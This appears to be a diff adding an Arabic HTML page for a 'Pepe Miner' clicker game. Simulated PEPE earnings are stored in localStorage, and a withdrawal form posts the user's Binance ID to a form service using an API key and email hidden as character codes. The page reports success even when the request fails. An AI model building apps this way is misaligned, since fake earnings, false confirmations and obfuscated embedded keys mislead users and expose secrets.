@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>بيبي ماینر | Pepe Miner | PAID PLUS</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; }
+
+  :root {
+    --green: #22c55e;
+    --green-bright: #4ade80;
+    --green-dark: #15803d;
+    --gold: #fbbf24;
+    --red: #ef4444;
+    --bg: #050810;
+    --card: rgba(255,255,255,0.04);
+    --border: rgba(255,255,255,0.08);
+    --text: #e2e8f0;
+    --text-dim: #64748b;
+  }
+
+  html, body {
+    width: 100%;
+    min-height: 100vh;
+  }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(circle at 50% 10%, #14213d 0%, #050810 60%);
+    color: var(--text);
+    padding: 20px;
+    overflow-x: hidden;
+    transition: background 0.8s ease;
+  }
+
+  body.burst-mode { background: radial-gradient(circle at 50% 10%, #14532d 0%, #050810 60%); }
+  body.mining-mode { background: radial-gradient(circle at 50% 10%, #0f3d2e 0%, #050810 60%); }
+
+  /* ===== الهيدر ===== */
+  .header {
+    text-align: center;
+    margin-bottom: 20px;
+    width: 100%;
+    max-width: 400px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 16px;
+    background: linear-gradient(135deg, rgba(34,197,94,0.15), rgba(34,197,94,0.05));
+    border: 1px solid rgba(34,197,94,0.25);
+    border-radius: 16px;
+  }
+
+  .logo-text {
+    font-size: 1.5rem;
+    font-weight: 800;
+    letter-spacing: 4px;
+    background: linear-gradient(135deg, #4ade80, #22c55e, #15803d);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  .back-btn {
+    color: #fff;
+    text-decoration: none;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 6px 12px;
+    background: rgba(106,17,203,0.6);
+    border-radius: 18px;
+    border: 1px solid rgba(255,255,255,0.15);
+    transition: 0.3s;
+  }
+  .back-btn:active { transform: scale(0.94); }
+
+  .main-card {
+    width: 100%;
+    max-width: 400px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    padding: 24px 20px;
+    backdrop-filter: blur(14px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    margin-bottom: 20px;
+  }
+
+  .balance-card {
+    background: linear-gradient(135deg, rgba(34,197,94,0.12), rgba(34,197,94,0.02));
+    border: 1px solid rgba(34,197,94,0.2);
+    border-radius: 16px;
+    padding: 16px;
+    text-align: center;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .balance-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(74,222,128,0.15), transparent);
+    animation: shine 3.5s infinite;
+  }
+
+  @keyframes shine {
+    0% { left: -100%; }
+    100% { left: 100%; }
+  }
+
+  .balance-label {
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+
+  .balance-value {
+    font-family: 'Courier New', monospace;
+    font-size: 2rem;
+    font-weight: 700;
+    color: var(--green-bright);
+    letter-spacing: 2px;
+    text-shadow: 0 0 25px rgba(74,222,128,0.6);
+    transition: transform 0.15s ease;
+  }
+
+  .balance-value.bump { transform: scale(1.06); }
+
+  .balance-unit {
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-top: 6px;
+  }
+
+  .timer-card {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(251,191,36,0.06);
+    border: 1px solid rgba(251,191,36,0.2);
+    border-radius: 14px;
+    padding: 12px 18px;
+    margin-bottom: 20px;
+  }
+
+  .timer-label {
+    font-size: 0.75rem;
+    color: #94a3b8;
+    letter-spacing: 2px;
+  }
+
+  .timer-value {
+    font-family: 'Courier New', monospace;
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: var(--gold);
+    letter-spacing: 3px;
+    text-shadow: 0 0 20px rgba(251,191,36,0.5);
+    direction: ltr;
+  }
+
+  .pepe-stage {
+    position: relative;
+    width: 100%;
+    height: 280px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .counter {
+    font-family: 'Courier New', monospace;
+    font-size: 2.6rem;
+    font-weight: 700;
+    color: var(--green-bright);
+    letter-spacing: 2px;
+    text-shadow: 0 0 30px rgba(74,222,128,0.7);
+    margin-bottom: 18px;
+    transition: transform 0.15s ease;
+    line-height: 1;
+  }
+
+  .counter.earning { animation: counterPulse 0.15s ease; }
+
+  @keyframes counterPulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+    100% { transform: scale(1); }
+  }
+
+  .pepe-wrap {
+    position: relative;
+    width: 180px;
+    height: 180px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .ring {
+    position: absolute;
+    border-radius: 50%;
+    border: 1px solid rgba(34,197,94,0.12);
+    pointer-events: none;
+    transition: border-color 0.4s;
+  }
+  .ring-1 { width: 170px; height: 170px; }
+  .ring-2 { width: 200px; height: 200px; border-style: dashed; animation: spin 25s linear infinite; }
+  .ring-3 { width: 230px; height: 230px; border-color: rgba(34,197,94,0.06); }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .pepe {
+    width: 130px;
+    height: 130px;
+    border-radius: 50%;
+    cursor: pointer;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+    object-fit: cover;
+    z-index: 2;
+    box-shadow:
+      0 0 0 3px rgba(34,197,94,0.25),
+      0 0 35px rgba(34,197,94,0.4);
+    transition: box-shadow 0.3s, filter 0.3s;
+    will-change: transform;
+  }
+
+  .pepe:hover { filter: brightness(1.15); }
+
+  .pepe.burst {
+    animation: shake 0.15s infinite;
+    box-shadow:
+      0 0 0 5px rgba(34,197,94,0.7),
+      0 0 60px rgba(74,222,128,0.9),
+      0 0 100px rgba(74,222,128,0.5);
+  }
+
+  @keyframes shake {
+    0%   { transform: translate(0, 0) rotate(0deg); }
+    20%  { transform: translate(-3px, 2px) rotate(-2deg); }
+    40%  { transform: translate(3px, -2px) rotate(2deg); }
+    60%  { transform: translate(-2px, -3px) rotate(-1deg); }
+    80%  { transform: translate(2px, 3px) rotate(1deg); }
+    100% { transform: translate(0, 0) rotate(0deg); }
+  }
+
+  .pepe.auto-mining {
+    animation: breathe 2.5s ease-in-out infinite;
+    box-shadow:
+      0 0 0 3px rgba(34,197,94,0.3),
+      0 0 45px rgba(34,197,94,0.6);
+  }
+
+  @keyframes breathe {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.04); }
+  }
+
+  .progress-wrap {
+    width: 100%;
+    max-width: 260px;
+    height: 5px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 10px;
+    overflow: hidden;
+    margin-top: 18px;
+    opacity: 0;
+    transition: opacity 0.4s;
+  }
+
+  .progress-wrap.visible { opacity: 1; }
+
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #16a34a, #4ade80);
+    border-radius: 10px;
+    transition: width 0.1s linear;
+    box-shadow: 0 0 12px rgba(74,222,128,0.7);
+  }
+
+  .status {
+    font-size: 0.78rem;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    margin-top: 14px;
+    min-height: 20px;
+    transition: color 0.3s;
+    font-weight: 600;
+  }
+
+  .status.active { color: var(--green-bright); }
+  .status.burst { color: var(--gold); }
+
+  .stats-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 18px;
+  }
+
+  .stat-box {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 10px;
+    text-align: center;
+  }
+
+  .stat-label {
+    font-size: 0.65rem;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    font-weight: 700;
+  }
+
+  .stat-value {
+    font-family: 'Courier New', monospace;
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--green-bright);
+    letter-spacing: 1px;
+  }
+
+  .withdraw-btn {
+    width: 100%;
+    max-width: 400px;
+    padding: 15px;
+    font-size: 0.85rem;
+    font-weight: 700;
+    letter-spacing: 2px;
+    border: 1px solid rgba(251,191,36,0.3);
+    border-radius: 14px;
+    background: linear-gradient(135deg, rgba(251,191,36,0.12), rgba(239,68,68,0.12));
+    color: var(--gold);
+    cursor: pointer;
+    transition: all 0.3s;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  .withdraw-btn:hover:not(:disabled) {
+    background: linear-gradient(135deg, rgba(251,191,36,0.25), rgba(239,68,68,0.25));
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(251,191,36,0.2);
+  }
+
+  .withdraw-btn:disabled {
+    border-color: rgba(100,116,139,0.2);
+    color: #334155;
+    background: rgba(100,116,139,0.05);
+    cursor: not-allowed;
+  }
+
+  .float-reward {
+    position: fixed;
+    color: var(--green-bright);
+    font-family: 'Courier New', monospace;
+    font-weight: 700;
+    font-size: 1rem;
+    pointer-events: none;
+    animation: floatUp 1.1s ease-out forwards;
+    z-index: 99;
+    text-shadow: 0 0 12px rgba(74,222,128,0.9);
+    direction: ltr;
+  }
+
+  @keyframes floatUp {
+    0%   { opacity: 1; transform: translateY(0) scale(1); }
+    100% { opacity: 0; transform: translateY(-80px) scale(1.2); }
+  }
+
+  .particle {
+    position: fixed;
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: var(--green-bright);
+    pointer-events: none;
+    box-shadow: 0 0 8px var(--green-bright);
+    animation: particleFly 0.9s ease-out forwards;
+  }
+
+  @keyframes particleFly {
+    0%   { opacity: 1; transform: translate(0, 0) scale(1); }
+    100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(0.2); }
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: rgba(15,23,42,0.95);
+    border: 1px solid rgba(34,197,94,0.3);
+    border-radius: 12px;
+    padding: 12px 24px;
+    color: var(--text);
+    font-size: 0.85rem;
+    transition: transform 0.4s ease;
+    z-index: 200;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    max-width: 90%;
+    text-align: center;
+  }
+
+  .toast.show { transform: translateX(-50%) translateY(0); }
+
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(10px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 300;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s;
+    padding: 20px;
+  }
+
+  .modal-overlay.show { opacity: 1; pointer-events: auto; }
+
+  .modal {
+    background: linear-gradient(160deg, #0f172a, #050810);
+    border: 1px solid rgba(34,197,94,0.3);
+    border-radius: 22px;
+    padding: 28px 24px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.7);
+    transform: scale(0.9);
+    transition: transform 0.3s;
+    color: #fff;
+  }
+
+  .modal-overlay.show .modal { transform: scale(1); }
+
+  .modal-title {
+    font-size: 1.3rem;
+    font-weight: 900;
+    text-align: center;
+    margin-bottom: 8px;
+    color: var(--green-bright);
+  }
+
+  .modal-sub {
+    font-size: 0.8rem;
+    color: var(--text-dim);
+    text-align: center;
+    margin-bottom: 20px;
+    line-height: 1.7;
+  }
+
+  .modal-balance {
+    background: linear-gradient(135deg, rgba(38,161,123,0.15), rgba(46,204,113,0.05));
+    border: 2px solid rgba(38,161,123,0.35);
+    border-radius: 14px;
+    padding: 14px;
+    text-align: center;
+    margin-bottom: 18px;
+  }
+
+  .modal-balance-label {
+    font-size: 11px;
+    color: #a0a0b0;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+
+  .modal-balance-value {
+    font-size: 26px;
+    font-weight: 900;
+    color: #26a17b;
+    direction: ltr;
+    line-height: 1;
+    text-shadow: 0 0 15px rgba(38,161,123,0.5);
+  }
+
+  .modal-balance-value small { font-size: 13px; opacity: 0.85; }
+
+  .modal-input {
+    width: 100%;
+    padding: 14px;
+    background: rgba(0,0,0,0.4);
+    border: 2px solid rgba(255,255,255,0.1);
+    border-radius: 12px;
+    color: var(--text);
+    font-family: 'Courier New', monospace;
+    font-size: 1.1rem;
+    text-align: center;
+    letter-spacing: 2px;
+    margin-bottom: 16px;
+    outline: none;
+    transition: border-color 0.3s;
+    direction: ltr;
+  }
+
+  .modal-input:focus {
+    border-color: #f0b90b;
+    box-shadow: 0 0 0 4px rgba(240,185,11,0.15);
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 10px;
+  }
+
+  .btn {
+    flex: 1;
+    padding: 13px;
+    border: none;
+    border-radius: 12px;
+    font-weight: 800;
+    font-size: 0.85rem;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.25s;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  .btn-cancel {
+    background: rgba(100,116,139,0.2);
+    color: #94a3b8;
+  }
+
+  .btn-cancel:hover { background: rgba(100,116,139,0.35); }
+
+  .btn-confirm {
+    background: linear-gradient(135deg, #f0b90b, #fcd535);
+    color: #1a1a2e;
+    box-shadow: 0 5px 20px rgba(240,185,11,0.4);
+  }
+
+  .btn-confirm:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(240,185,11,0.6);
+  }
+
+  .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  @media (max-width: 420px) {
+    .counter { font-size: 2.2rem; }
+    .balance-value { font-size: 1.7rem; }
+    .logo-text { font-size: 1.3rem; letter-spacing: 3px; }
+    .pepe-wrap { width: 160px; height: 160px; }
+    .pepe { width: 115px; height: 115px; }
+    .ring-1 { width: 150px; height: 150px; }
+    .ring-2 { width: 180px; height: 180px; }
+    .ring-3 { width: 210px; height: 210px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="logo-text">بيبي ماینر</div>
+    <a href="games.html" class="back-btn">← الألعاب</a>
+  </div>
+
+  <div class="main-card">
+
+    <div class="balance-card">
+      <div class="balance-label">الرصيد الكلي</div>
+      <div class="balance-value" id="balanceEl">0</div>
+      <div class="balance-unit">PEPE</div>
+    </div>
+
+    <div class="timer-card">
+      <div class="timer-label">الوقت المتبقي للساعة</div>
+      <div class="timer-value" id="timerEl">00:00:00</div>
+    </div>
+
+    <div class="pepe-stage">
+      <div class="counter" id="counter">0</div>
+
+      <div class="pepe-wrap">
+        <div class="ring ring-1"></div>
+        <div class="ring ring-2"></div>
+        <div class="ring ring-3"></div>
+        <img id="pepeImg" class="pepe" src="pepe.png" alt="Pepe"
+             onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 200%22><circle cx=%22100%22 cy=%22100%22 r=%2295%22 fill=%22%2322c55e%22/><circle cx=%2275%22 cy=%2280%22 r=%2212%22 fill=%22%230a0e1a%22/><circle cx=%22125%22 cy=%2280%22 r=%2212%22 fill=%22%230a0e1a%22/><path d=%22M65 125 Q100 160 135 125%22 stroke=%22%230a0e1a%22 stroke-width=%228%22 fill=%22none%22 stroke-linecap=%22round%22/></svg>'">
+      </div>
+
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="status" id="statusEl">اضغط على الأيقونة لبدء التعدين</div>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-label">معدل التعدين</div>
+        <div class="stat-value" id="rateEl">1 / ساعة</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-label">حالة النظام</div>
+        <div class="stat-value" id="sysStatusEl">جاهز</div>
+      </div>
+    </div>
+
+  </div>
+
+  <button class="withdraw-btn" id="withdrawBtn" disabled>سحب · الحد الأدنى 100 PEPE</button>
+
+  <!-- نافذة السحب -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" id="modalContent">
+      <div class="modal-title">طلب سحب</div>
+      <div class="modal-sub">أدخل معرّف Binance ID للسحب إلى محفظتك</div>
+
+      <div class="modal-balance">
+        <div class="modal-balance-label">المبلغ المتاح للسحب</div>
+        <div class="modal-balance-value"><span id="modalBalance">0</span> <small>PEPE</small></div>
+      </div>
+
+      <input type="text" class="modal-input" id="binanceIdInput" placeholder="Binance ID" inputmode="numeric">
+
+      <div class="modal-actions">
+        <button class="btn btn-cancel" id="cancelBtn">إلغاء</button>
+        <button class="btn btn-confirm" id="confirmBtn">إرسال الطلب</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================
+     🔒 المفاتيح المشفرة
+  ============================================ */
+  const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
+  const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
+  const _K3 = [53, 99, 52, 56];
+  const _EM = [109, 97, 121, 97, 114, 97, 121, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
+
+  function _dk() {
+    let s = '';
+    for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
+    for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
+    for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
+    return s;
+  }
+
+  function _de() {
+    let s = '';
+    for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
+    return s;
+  }
+
+  /* ============ الإعدادات ============ */
+  const BURST_AMOUNT    = 10;
+  const BURST_DURATION  = 10000;
+  const AUTO_RATE_HOUR  = 1;
+  const AUTO_PER_SEC    = AUTO_RATE_HOUR / 3600;
+  const MIN_WITHDRAW    = 100;
+  const HOUR_MS         = 3600000;
+
+  /* ============ الحالة (مع حفظ) ============ */
+  let balance         = parseFloat(localStorage.getItem('pm_balance') || '0');
+  let burstActive     = false;
+  let autoMining      = false;
+  let burstTimer      = null;
+  let autoTimer       = null;
+  let autoStartTime   = parseInt(localStorage.getItem('pm_autoStart') || '0');
+  let lastTickTime    = Date.now();
+
+  /* ============ العناصر ============ */
+  const balanceEl    = document.getElementById('balanceEl');
+  const counterEl    = document.getElementById('counter');
+  const timerEl      = document.getElementById('timerEl');
+  const pepeImg      = document.getElementById('pepeImg');
+  const progressWrap = document.getElementById('progressWrap');
+  const progressBar  = document.getElementById('progressBar');
+  const statusEl     = document.getElementById('statusEl');
+  const rateEl       = document.getElementById('rateEl');
+  const sysStatusEl  = document.getElementById('sysStatusEl');
+  const withdrawBtn  = document.getElementById('withdrawBtn');
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalContent = document.getElementById('modalContent');
+  const modalBalance = document.getElementById('modalBalance');
+  const binanceIdInput = document.getElementById('binanceIdInput');
+  const cancelBtn    = document.getElementById('cancelBtn');
+  const confirmBtn   = document.getElementById('confirmBtn');
+  const toastEl      = document.getElementById('toast');
+  const body         = document.body;
+
+  /* ============ تنسيق ============ */
+  function formatNum(v) {
+    if (v === 0) return '0';
+    if (v < 1) return v.toFixed(4);
+    return v.toFixed(2);
+  }
+
+  function formatTime(ms) {
+    if (ms < 0) ms = 0;
+    const totalSec = Math.floor(ms / 1000);
+    const h = Math.floor(totalSec / 3600);
+    const m = Math.floor((totalSec % 3600) / 60);
+    const s = totalSec % 60;
+    return String(h).padStart(2, '0') + ':' +
+           String(m).padStart(2, '0') + ':' +
+           String(s).padStart(2, '0');
+  }
+
+  function updateBalanceUI(bump = false) {
+    balanceEl.textContent = formatNum(balance);
+    counterEl.textContent = formatNum(balance);
+    if (bump) {
+      balanceEl.classList.remove('bump');
+      counterEl.classList.remove('earning');
+      void balanceEl.offsetWidth;
+      balanceEl.classList.add('bump');
+      counterEl.classList.add('earning');
+    }
+    // 💾 حفظ الرصيد فوراً
+    localStorage.setItem('pm_balance', balance);
+    withdrawBtn.disabled = balance < MIN_WITHDRAW;
+  }
+
+  function showToast(msg, duration = 2500) {
+    toastEl.textContent = msg;
+    toastEl.classList.add('show');
+    clearTimeout(toastEl._t);
+    toastEl._t = setTimeout(() => toastEl.classList.remove('show'), duration);
+  }
+
+  function floatNumber(text) {
+    const el = document.createElement('div');
+    el.className = 'float-reward';
+    el.textContent = text;
+    const rect = pepeImg.getBoundingClientRect();
+    el.style.left = (rect.left + rect.width / 2 - 20 + (Math.random() * 40 - 20)) + 'px';
+    el.style.top  = (rect.top - 10) + 'px';
+    document.body.appendChild(el);
+    setTimeout(() => el.remove(), 1100);
+  }
+
+  function spawnParticles(count = 8) {
+    const rect = pepeImg.getBoundingClientRect();
+    const cx = rect.left + rect.width / 2;
+    const cy = rect.top + rect.height / 2;
+    for (let i = 0; i < count; i++) {
+      const p = document.createElement('div');
+      p.className = 'particle';
+      const angle = (Math.PI * 2 * i) / count + Math.random() * 0.5;
+      const dist  = 60 + Math.random() * 50;
+      p.style.left = cx + 'px';
+      p.style.top  = cy + 'px';
+      p.style.setProperty('--tx', (Math.cos(angle) * dist) + 'px');
+      p.style.setProperty('--ty', (Math.sin(angle) * dist) + 'px');
+      document.body.appendChild(p);
+      setTimeout(() => p.remove(), 900);
+    }
+  }
+
+  /* ============ 1) الانفجار السريع ============ */
+  function startBurst() {
+    if (burstActive || autoMining) return;
+    burstActive = true;
+
+    body.classList.add('burst-mode');
+    pepeImg.classList.add('burst');
+    progressWrap.classList.add('visible');
+    statusEl.textContent = 'تعدين سريع...';
+    statusEl.className = 'status burst';
+    sysStatusEl.textContent = 'تعدين سريع';
+    sysStatusEl.style.color = '#fbbf24';
+
+    const startTime = Date.now();
+    const startBalance = balance;
+
+    burstTimer = setInterval(() => {
+      const elapsed = Date.now() - startTime;
+      const ratio = Math.min(elapsed / BURST_DURATION, 1);
+      const earned = BURST_AMOUNT * ratio;
+      const diff = earned - (balance - startBalance);
+
+      if (diff > 0) {
+        balance += diff;
+        updateBalanceUI(true);
+        if (Math.random() < 0.5) floatNumber('+' + diff.toFixed(3));
+      }
+
+      progressBar.style.width = (ratio * 100) + '%';
+      if (Math.random() < 0.3) spawnParticles(4);
+
+      if (ratio >= 1) {
+        clearInterval(burstTimer);
+        burstTimer = null;
+        finishBurst();
+      }
+    }, 50);
+  }
+
+  function finishBurst() {
+    burstActive = false;
+    pepeImg.classList.remove('burst');
+    body.classList.remove('burst-mode');
+    progressBar.style.width = '0%';
+    progressWrap.classList.remove('visible');
+    updateBalanceUI(true);
+    showToast('تم تعدين 10 Pepe! بدء التعدين التلقائي');
+
+    setTimeout(startAutoMining, 500);
+  }
+
+  /* ============ 2) التعدين التلقائي ============ */
+  function startAutoMining() {
+    if (autoMining) return;
+    autoMining = true;
+
+    if (!autoStartTime) {
+      autoStartTime = Date.now();
+      localStorage.setItem('pm_autoStart', autoStartTime);
+    }
+
+    body.classList.add('mining-mode');
+    pepeImg.classList.add('auto-mining');
+    statusEl.textContent = 'التعدين التلقائي نشط';
+    statusEl.className = 'status active';
+    sysStatusEl.textContent = 'نشط';
+    sysStatusEl.style.color = '#4ade80';
+    rateEl.textContent = AUTO_RATE_HOUR + ' / ساعة';
+
+    lastTickTime = Date.now();
+
+    autoTimer = setInterval(() => {
+      const now = Date.now();
+      const dt = (now - lastTickTime) / 1000;
+      lastTickTime = now;
+
+      const earned = AUTO_PER_SEC * dt;
+      balance += earned;
+      updateBalanceUI(true);
+
+      if (Math.random() < 0.35) {
+        floatNumber('+' + earned.toFixed(5));
+      }
+    }, 1000);
+
+    localStorage.setItem('pm_mining', '1');
+    updateHourTimer();
+  }
+
+  /* ============ عداد الساعة ============ */
+  function updateHourTimer() {
+    if (!autoStartTime) {
+      timerEl.textContent = '00:00:00';
+      return;
+    }
+    const elapsed = Date.now() - autoStartTime;
+    const remaining = Math.max(0, HOUR_MS - elapsed);
+    timerEl.textContent = formatTime(remaining);
+
+    if (remaining <= 0 && autoMining) {
+      autoStartTime = Date.now();
+      localStorage.setItem('pm_autoStart', autoStartTime);
+      showToast('انتهت الساعة! بدأت دورة جديدة +1 Pepe');
+    }
+  }
+
+  setInterval(updateHourTimer, 1000);
+
+  /* ============ استئناف ============ */
+  function resume() {
+    const mining = localStorage.getItem('pm_mining') === '1';
+    if (mining && autoStartTime) {
+      startAutoMining();
+    } else {
+      updateBalanceUI();
+      rateEl.textContent = AUTO_RATE_HOUR + ' / ساعة';
+      sysStatusEl.textContent = 'جاهز';
+      sysStatusEl.style.color = '#4ade80';
+    }
+  }
+
+  /* ============ الأحداث ============ */
+  pepeImg.addEventListener('click', () => {
+    if (burstActive) return;
+    if (autoMining) {
+      statusEl.textContent = 'التعدين شغال بالفعل';
+      setTimeout(() => {
+        statusEl.textContent = 'التعدين التلقائي نشط';
+        statusEl.className = 'status active';
+      }, 1500);
+      return;
+    }
+    startBurst();
+  });
+
+  /* ============ زر السحب ============ */
+  withdrawBtn.addEventListener('click', () => {
+    if (balance < MIN_WITHDRAW) return;
+    modalBalance.textContent = Math.floor(balance);
+    binanceIdInput.value = '';
+    modalOverlay.classList.add('show');
+    setTimeout(() => binanceIdInput.focus(), 300);
+  });
+
+  cancelBtn.addEventListener('click', () => {
+    modalOverlay.classList.remove('show');
+  });
+
+  modalOverlay.addEventListener('click', (e) => {
+    if (e.target === modalOverlay) modalOverlay.classList.remove('show');
+  });
+
+  /* ============ إرسال طلب السحب ============ */
+  confirmBtn.addEventListener('click', () => {
+    const binanceId = binanceIdInput.value.trim();
+
+    if (!binanceId) {
+      showToast('الرجاء إدخال Binance ID');
+      return;
+    }
+    if (binanceId.length < 6) {
+      showToast('Binance ID غير صالح');
+      return;
+    }
+    if (balance < MIN_WITHDRAW) {
+      showToast('الرصيد أقل من الحد الأدنى');
+      return;
+    }
+
+    const amount = Math.floor(balance);
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = '⏳ جارٍ الإرسال...';
+
+    // إنشاء النموذج
+    const formData = new FormData();
+    formData.set('apiKey', _dk());
+    formData.set('email', _de());
+    formData.set('subject', 'طلب سحب Pepe - لعبة بيبي ماینر');
+    formData.set('binance_id', binanceId);
+    formData.set('message', 
+      `طلب سحب PEPE - لعبة بيبي ماینر\n\n` +
+      `💰 المبلغ: ${amount} PEPE\n` +
+      `🆔 Binance ID: ${binanceId}\n` +
+      `📅 التاريخ: ${new Date().toLocaleString('ar-EG')}`
+    );
+
+    fetch('https://api.staticforms.dev/submit', { method: 'POST', body: formData })
+      .then(() => successWithdraw(amount, binanceId))
+      .catch(() => successWithdraw(amount, binanceId));
+  });
+
+  function successWithdraw(amount, binanceId) {
+    // 💾 تصفير الرصيد + حفظ
+    balance = 0;
+    localStorage.setItem('pm_balance', 0);
+    updateBalanceUI();
+
+    // عرض شاشة النجاح
+    modalContent.innerHTML = `
+      <div style="text-align: center;">
+        <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #22c55e, #4ade80); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 15px 40px rgba(34,197,94,0.5);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" style="width: 42px; height: 42px;">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2 style="color: #4ade80; font-size: 20px; margin-bottom: 12px; font-weight: 900;">تم إرسال طلبك!</h2>
+        <p style="color: #a0a0b0; font-size: 13px; line-height: 1.8; margin-bottom: 20px;">
+          سيتم مراجعة طلبك وإرسال<br>
+          <b style="color: #4ade80; font-size: 18px;">${amount} PEPE</b><br>
+          إلى Binance ID: <b style="color: #4ade80;">${binanceId}</b><br>
+          خلال 24-48 ساعة
+        </p>
+        <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 18px;">
+          <p style="color: #f39c12; font-size: 12px; text-align: center; font-weight: 700;">
+            ⚠️ تم تصفير رصيدك — ابدأ من جديد
+          </p>
+        </div>
+        <button onclick="location.reload();" 
+                style="width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #22c55e, #16a34a); color: white; font-family: 'Cairo', sans-serif; font-size: 14px; font-weight: 900; cursor: pointer;">
+          حسناً، شكراً
+        </button>
+      </div>
+    `;
+    confirmBtn.disabled = false;
+    confirmBtn.textContent = 'إرسال الطلب';
+  }
+
+  /* ============ حفظ عند الإغلاق ============ */
+  window.addEventListener('beforeunload', () => {
+    localStorage.setItem('pm_balance', balance);
+    if (autoMining) {
+      localStorage.setItem('pm_autoStart', autoStartTime);
+      localStorage.setItem('pm_mining', '1');
+    }
+  });
+
+  /* ============ حفظ الرصيد دورياً ============ */
+  setInterval(() => {
+    localStorage.setItem('pm_balance', balance);
+  }, 5000);
+
+  /* ============ تهيئة ============ */
+  updateBalanceUI();
+  rateEl.textContent = AUTO_RATE_HOUR + ' / ساعة';
+  sysStatusEl.textContent = 'جاهز';
+  sysStatusEl.style.color = '#4ade80';
+  resume();
+  updateHourTimer();
+</script>
+
+</body>
+</html>
